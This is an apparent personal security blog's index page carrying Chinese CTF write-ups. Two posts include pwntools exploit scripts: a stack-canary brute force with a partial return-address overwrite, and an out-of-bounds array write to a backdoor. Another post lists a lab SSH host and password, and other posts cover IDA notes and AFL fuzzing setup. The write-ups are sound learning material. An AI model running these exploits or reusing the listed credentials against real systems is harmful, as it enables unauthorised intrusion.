<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.2/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"xiaosolll.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.2.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
  </script>
<meta property="og:type" content="website">
<meta property="og:title" content="Antinomy">
<meta property="og:url" content="https://xiaosolll.github.io/index.html">
<meta property="og:site_name" content="Antinomy">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="eetan">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://xiaosolll.github.io/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>
<title>Antinomy</title>
  




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Antinomy</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">eetan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/09/iscc-hello-Pwner-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/09/iscc-hello-Pwner-wp/" class="post-title-link" itemprop="url">iscc_hello_Pwner_wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-05-09 11:51:39 / Modified: 12:37:21" itemprop="dateCreated datePublished" datetime="2021-05-09T11:51:39+08:00">2021-05-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="iscc-hello-pwner-wp"><a href="#iscc-hello-pwner-wp" class="headerlink" title="iscc_hello_pwner_wp"></a>iscc_hello_pwner_wp</h1><blockquote>
<p>one-by-one 爆破Canary原理</p>
<p>1.对于Canary，虽然每次进程重启后Canary不同，但是同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存。</p>
<p>2.最低位为0x00，之后逐次爆破，如果canary爆破不成功，则程序崩溃；爆破成功则程序进行下面的逻辑。由此可判断爆破是否成功。</p>
</blockquote>
<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><p><img src="https://i.imgur.com/wkVw66U.png"></p>
<p>无限循环fork()子进程</p>
<p>进入vuln()函数：</p>
<h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln()"></a>vuln()</h2><p><img src="https://i.imgur.com/M6f5TTi.png"></p>
<p>可以看到v1正是canary，其位置在ebp-0xc。</p>
<p>缓冲区在ebp-0x70的位置。</p>
<h2 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h2><p><img src="https://i.imgur.com/NXpaIJh.png"></p>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><blockquote>
<p>LD_PRELOAD=/lib/i386-linux-gnu/libc.so.6 ./hello_Pwner</p>
<p>ps -el</p>
<p>sudo gdb attach  pid</p>
</blockquote>
<p><img src="https://i.imgur.com/E5SiKcM.png"></p>
<p>动态调试发现backdoor的地址和read_plt的地址只有后四位不同，后三位各函数都是固定的，于是只需要爆破第四位就行。</p>
<h2 id="爆破canary"><a href="#爆破canary" class="headerlink" title="爆破canary"></a>爆破canary</h2><blockquote>
<p><em>anary</em>一般是尾随的(也有特殊情况,具体看作者的汇编情况),在32位下是4个<em>字节</em>,64位下是8个<em>字节</em>(最低位都是\x00) </p>
</blockquote>
<p>这里通过循环实现对剩余七个字节的爆破，（CANARY的最低字节为00）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">canary &#x3D; &#39;\x00&#39;</span><br><span class="line">for k in range(3):</span><br><span class="line">    for i in range(256):</span><br><span class="line">        print &quot;the &quot; + str(k) + &quot;: &quot; + chr(i)</span><br><span class="line">        p.send(&#39;a&#39;*100 + canary + chr(i))</span><br><span class="line">        a &#x3D; p.recvuntil(&quot;Hello,Pwner!\n&quot;)</span><br><span class="line">        print a</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        if &quot;*** stack smashing detected ***: .&#x2F;hello_Pwner terminated\n&quot; in a:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">                canary +&#x3D; chr(i)</span><br><span class="line">                print &quot;canary: &quot; + canary</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>


<p>payload = ‘A’ * 100 + canary + ‘A’ * 12 + “\xba\x<strong>7</strong>7”</p>
<blockquote>
<p>这个7可以换成0-f的任意一个</p>
</blockquote>
<p>最后的exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]</span><br><span class="line">context(arch&#x3D;&#39;i386&#39;, os&#x3D;&#39;linux&#39;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;hello_Pwner&#39;)</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    p &#x3D; process(&#39;.&#x2F;hello_Pwner&#39;)</span><br><span class="line">    elf&#x3D;ELF(&#39;.&#x2F;hello_Pwner&#39;)</span><br><span class="line">    #libc &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    p &#x3D; remote(&#39;39.96.88.40&#39;,8010)</span><br><span class="line">    libc &#x3D; ELF(&#39;.&#x2F;hello_Pwner&#39;)</span><br><span class="line">p.recvuntil(&#39;Hello,Pwner!\n&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_gots&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">print p32(puts_plt)</span><br><span class="line"></span><br><span class="line">canary &#x3D; &#39;\x00&#39;</span><br><span class="line">for k in range(3):</span><br><span class="line">    for i in range(256):</span><br><span class="line">        print &quot;the &quot; + str(k) + &quot;: &quot; + chr(i)</span><br><span class="line">        p.send(&#39;a&#39;*100 + canary + chr(i))</span><br><span class="line">        a &#x3D; p.recvuntil(&quot;Hello,Pwner!\n&quot;)</span><br><span class="line">        print a</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        if &quot;*** stack smashing detected ***: &lt;unknown&gt; terminated\n&quot; in a:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">                canary +&#x3D; chr(i)</span><br><span class="line">                print &quot;canary: &quot; + canary</span><br><span class="line">                break</span><br><span class="line">payload &#x3D; &#39;A&#39; * 100 + canary + &#39;A&#39; * 12 + &quot;\xba\x77&quot;#read  and back zhi you  hou si ge zi jie bu yi yang</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<p> 对远端多次运行exp，总有一次成功。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/02/iscc-pwn1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/02/iscc-pwn1/" class="post-title-link" itemprop="url">iscc_pwn1</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-05-02 15:04:00 / Modified: 19:07:29" itemprop="dateCreated datePublished" datetime="2021-05-02T15:04:00+08:00">2021-05-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="pwn1-练武"><a href="#pwn1-练武" class="headerlink" title="pwn1-练武"></a>pwn1-练武</h1><p>知识点：</p>
<blockquote>
<p>整数溢出绕过判断</p>
<p>栈溢出</p>
</blockquote>
<p>迷惑点：</p>
<blockquote>
<p>为什么不行</p>
</blockquote>
<p>10.10.45.78   22000   –ssh</p>
<p>zh:ctf</p>
<p>:123456qaz</p>
<p>别人：10000</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/02/ISCC-pwn-NUM-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/02/ISCC-pwn-NUM-wp/" class="post-title-link" itemprop="url">ISCC-pwn-NUM-wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-05-02 13:06:57 / Modified: 13:45:47" itemprop="dateCreated datePublished" datetime="2021-05-02T13:06:57+08:00">2021-05-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="NUM-wp"><a href="#NUM-wp" class="headerlink" title="NUM -wp"></a>NUM -wp</h1><p>学习到的知识点：</p>
<blockquote>
<p>IDA宏定义</p>
<p>IDA中改bug</p>
<p>数组、switch的伪代码分析</p>
</blockquote>
<h2 id="反汇编失败–参数不匹配"><a href="#反汇编失败–参数不匹配" class="headerlink" title="反汇编失败–参数不匹配"></a>反汇编失败–参数不匹配</h2><p><img src="https://i.imgur.com/kdQWRCR.png"></p>
<p>从汇编代码中可以看见scanf的参数是四个，而反汇编那里出来的参数多于四个。    </p>
<p><img src="https://i.imgur.com/6WpcZTZ.png"></p>
<p><img src="https://i.imgur.com/bU4r5I9.png"></p>
<p>在这里改为四个参数，将后面的参数全部删除。</p>
<p>按’y’键更改。</p>
<p><img src="https://i.imgur.com/QFPiGhV.png"></p>
<h2 id="读反汇编出的c语言代码"><a href="#读反汇编出的c语言代码" class="headerlink" title="读反汇编出的c语言代码"></a>读反汇编出的c语言代码</h2><p><img src="https://i.imgur.com/2102GnB.png"></p>
<p>这是一个数组，首地址(&amp;v17),a2是数组的长度。</p>
<p><img src="https://i.imgur.com/ZduiP7i.png"></p>
<p>这也是一个char数组的循环赋值</p>
<h2 id="多层循环实际上是switch语句"><a href="#多层循环实际上是switch语句" class="headerlink" title="多层循环实际上是switch语句"></a>多层循环实际上是switch语句</h2><p>可以看到后面的输入输出语句都是对应着菜单。</p>
<p>漏洞点在输入为3. Change One?，没有对数字进行边界控制，也就是说当我们只有一个a[3]数组，我们可以更改到a[1024]甚至更多。里面的数字就是对应首地址的偏移地址。</p>
<p><img src="https://i.imgur.com/tE3n3UI.png"></p>
<p><strong>假如v17[a2]访问到这里的print函数，并且地址是ret返回地址。我们就获得了程序控制。</strong></p>
<p><img src="https://i.imgur.com/jBqLbfT.png"></p>
<h2 id="数组的首地址"><a href="#数组的首地址" class="headerlink" title="数组的首地址"></a>数组的首地址</h2><p><img src="https://i.imgur.com/56laxlH.png"></p>
<p><img src="https://i.imgur.com/Uoe6NQ2.png"></p>
<p>这里创建输入数组数据</p>
<p>在gdb中输入1  1来看是否是数组的首地址。</p>
<p><img src="https://i.imgur.com/Ut7Z0eA.png"></p>
<p>在黄色高亮处gdb下断点。</p>
<p><img src="https://i.imgur.com/o8mouXN.png"></p>
<p>可以看到EDX是0x1也就是我们输入进去的1</p>
<p><img src="https://i.imgur.com/j9lxOiR.png"></p>
<h2 id="分析一下scanf-函数"><a href="#分析一下scanf-函数" class="headerlink" title="分析一下scanf()函数"></a>分析一下scanf()函数</h2><p><img src="https://i.imgur.com/8Ep6fUf.png"></p>
<p>从汇编中可以看到程序通过<strong>scanf</strong>将数据存储到栈中，然后通过<strong>eax和ecx</strong>将数据存储到<strong>eax</strong>中存放的地址中去（cl是ecx的低位）</p>
<p>那意味着在程序运行到<strong>0x08049321</strong>的位置时，此时eax中存放的即时数组的首地址。</p>
<p><img src="https://i.imgur.com/q07EHg5.png"></p>
<h2 id="找到数组和ret之间的偏移"><a href="#找到数组和ret之间的偏移" class="headerlink" title="找到数组和ret之间的偏移"></a>找到数组和ret之间的偏移</h2><p>数组首地址可以从gdb中知道，也就是eax的值。</p>
<blockquote>
<p>0xffffcf38 数组首地址</p>
</blockquote>
<p>而ret的值可以通过不断执行到ret，再查看esp的值从而得知。</p>
<blockquote>
<p>0xffffcfbc  返回地址</p>
</blockquote>
<p>之间的差值是0x84，也就是说数组的首地址再偏移0x84就到了ret的第一个字节。</p>
<p>于是wp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">process_name &#x3D; &#39;.&#x2F;NUM&#39;</span><br><span class="line">    # p &#x3D; process(process_name)</span><br><span class="line">p &#x3D; remote(&#39;39.96.88.40&#39;,7030)</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">hackhere &#x3D; [0xb2, 0x91, 0x04, 0x08]</span><br><span class="line">write_offset &#x3D; 0x84</span><br><span class="line">     </span><br><span class="line">def change_number(offset, value):</span><br><span class="line">  p.sendlineafter(&#39;5. Exit?&#39;, &#39;3&#39;)</span><br><span class="line">  p.sendlineafter(&#39;Change which?&#39;, str(offset))</span><br><span class="line">  p.sendlineafter(&#39;New NUM:&#39;, str(value))</span><br><span class="line">     </span><br><span class="line">p.sendlineafter(&#39;So, how many NUM?&#39;, &#39;1&#39;)</span><br><span class="line">p.sendlineafter(&#39;Send NUM&#39;, &#39;1&#39;)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">for i in range(4):</span><br><span class="line">  change_number(write_offset+i, hackhere[i])</span><br><span class="line">     </span><br><span class="line">p.sendlineafter(&#39;5. Exit?&#39;, &#39;5&#39;)</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<blockquote>
<p>注意缩进</p>
</blockquote>
<h2 id="仍有疑惑的点："><a href="#仍有疑惑的点：" class="headerlink" title="仍有疑惑的点："></a>仍有疑惑的点：</h2><blockquote>
<p>后面change的循环是怎么赋值的？</p>
<p>为什么用低一字节的dl传给[eax]?</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/01/IDA-learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/01/IDA-learn/" class="post-title-link" itemprop="url">IDA-learn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-05-01 15:02:45" itemprop="dateCreated datePublished" datetime="2021-05-01T15:02:45+08:00">2021-05-01</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-05-08 20:31:11" itemprop="dateModified" datetime="2021-05-08T20:31:11+08:00">2021-05-08</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="IDA-PRO-权威指南学习笔记"><a href="#IDA-PRO-权威指南学习笔记" class="headerlink" title="IDA PRO 权威指南学习笔记"></a>IDA PRO 权威指南学习笔记</h1><h2 id="IDA数据显示窗口"><a href="#IDA数据显示窗口" class="headerlink" title="IDA数据显示窗口"></a>IDA数据显示窗口</h2><ul>
<li>大部分窗口都可以通过view&gt;open subviews菜单打开</li>
<li><strong>ESC</strong>在反汇编窗口与web浏览器的“<strong>后退</strong>”类似</li>
</ul>
<h3 id="反汇编窗口"><a href="#反汇编窗口" class="headerlink" title="反汇编窗口"></a>反汇编窗口</h3><h4 id="面向文本"><a href="#面向文本" class="headerlink" title="面向文本"></a>面向文本</h4><p><img src="https://i.imgur.com/gL0xYPH.png"></p>
<p><img src="https://i.imgur.com/iUk0hnD.png"></p>
<h4 id="基于图形"><a href="#基于图形" class="headerlink" title="基于图形"></a>基于图形</h4><p><img src="https://i.imgur.com/3TK0xGZ.png"></p>
<p><img src="https://i.imgur.com/dkSjIgZ.png"></p>
<h5 id="创建其他反汇编窗口"><a href="#创建其他反汇编窗口" class="headerlink" title="创建其他反汇编窗口"></a>创建其他反汇编窗口</h5><p>一个窗口图形一个窗口文本</p>
<p><img src="https://i.imgur.com/fshDQ5R.png"></p>
<h3 id="name窗口"><a href="#name窗口" class="headerlink" title="name窗口"></a>name窗口</h3><p>列举二进制文件所有全局名称</p>
<blockquote>
<p>名称：对一个程序虚拟地址的符号描述</p>
</blockquote>
<p><img src="https://i.imgur.com/4XO0d4o.png"></p>
<h4 id="常用前缀"><a href="#常用前缀" class="headerlink" title="常用前缀"></a>常用前缀</h4><p><img src="https://i.imgur.com/miDpina.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/29/AFL-fuzz%20%E6%B5%8B%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/29/AFL-fuzz%20%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-04-29 21:48:21" itemprop="dateCreated datePublished" datetime="2021-04-29T21:48:21+08:00">2021-04-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="AFL-fuzz-测试"><a href="#AFL-fuzz-测试" class="headerlink" title="AFL-fuzz 测试"></a>AFL-fuzz 测试</h1><p>下载源码</p>
<p><a target="_blank" rel="noopener" href="https://lcamtuf.coredump.cx/afl/">https://lcamtuf.coredump.cx/afl/</a></p>
<p>解压并安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$make</span></span><br><span class="line"><span class="variable">$sudo</span> make all</span><br></pre></td></tr></table></figure>


<h2 id="这里以fuzz-upx为例进行测试"><a href="#这里以fuzz-upx为例进行测试" class="headerlink" title="这里以fuzz upx为例进行测试"></a>这里以fuzz upx为例进行测试</h2><h3 id="编译upx"><a href="#编译upx" class="headerlink" title="编译upx"></a>编译upx</h3><ul>
<li>upx项目地址([<em><a target="_blank" rel="noopener" href="https://github.com/upx/upx">https://github.com/upx/upx</a></em>)</li>
<li>因为afl会对有源码的程序进行重新编译,因此需要修改upx的Makefile</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> <span class="built_in">clone</span> https://github.com/upx/upx.git</span><br><span class="line"><span class="variable">$cd</span> upx</span><br><span class="line"><span class="variable">$vim</span> Makefile</span><br><span class="line">CC = /usr/<span class="built_in">local</span>/bin/afl-gcc <span class="comment">#添加此句</span></span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> src</span><br><span class="line"><span class="variable">$vim</span> Makefile</span><br><span class="line">CXX    ?= /usr/<span class="built_in">local</span>/bin/afl-g++ <span class="comment">#将CXX改成afl-g++</span></span><br></pre></td></tr></table></figure>


<p>通过upx的文档,还需要安装三个库:</p>
<h4 id="安装lzma-sdk"><a href="#安装lzma-sdk" class="headerlink" title="安装lzma-sdk"></a>安装lzma-sdk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> submodule update --init --recursive</span><br></pre></td></tr></table></figure>


<h4 id="安装ucl"><a href="#安装ucl" class="headerlink" title="安装ucl"></a>安装ucl</h4><ul>
<li><p>下载<a target="_blank" rel="noopener" href="http://www.oberhumer.com/opensource/ucl/#download">ucl</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.oberhumer.com/opensource/ucl/download/ucl-1.03.tar.gz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解压:tar -zxvf ucl-1.03.tar.gz</p>
</blockquote>
</li>
<li><p>编译:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> ucl-1.03</span><br><span class="line">$./configure</span><br><span class="line"><span class="variable">$make</span> </span><br><span class="line"><span class="variable">$sudo</span> make install</span><br></pre></td></tr></table></figure>


<blockquote>
<p>UCL编译错误</p>
<p>checking whether your compiler passes the ACC conformance test… FAILED<br>configure:<br>configure: Your compiler failed the ACC conformance test - for details see<br>configure: `config.log’. Please check that log file and consider sending<br>configure: a patch or bug-report to <a href="mailto:&#109;&#97;&#x72;&#107;&#x75;&#x73;&#x40;&#111;&#x62;&#x65;&#x72;&#x68;&#117;&#109;&#101;&#x72;&#x2e;&#99;&#111;&#x6d;">&#109;&#97;&#x72;&#107;&#x75;&#x73;&#x40;&#111;&#x62;&#x65;&#x72;&#x68;&#117;&#109;&#101;&#x72;&#x2e;&#99;&#111;&#x6d;</a>.<br>configure: Thanks for your support.<br>configure:<br>configure: error: ACC conformance test failed. Stop.</p>
</blockquote>
<blockquote>
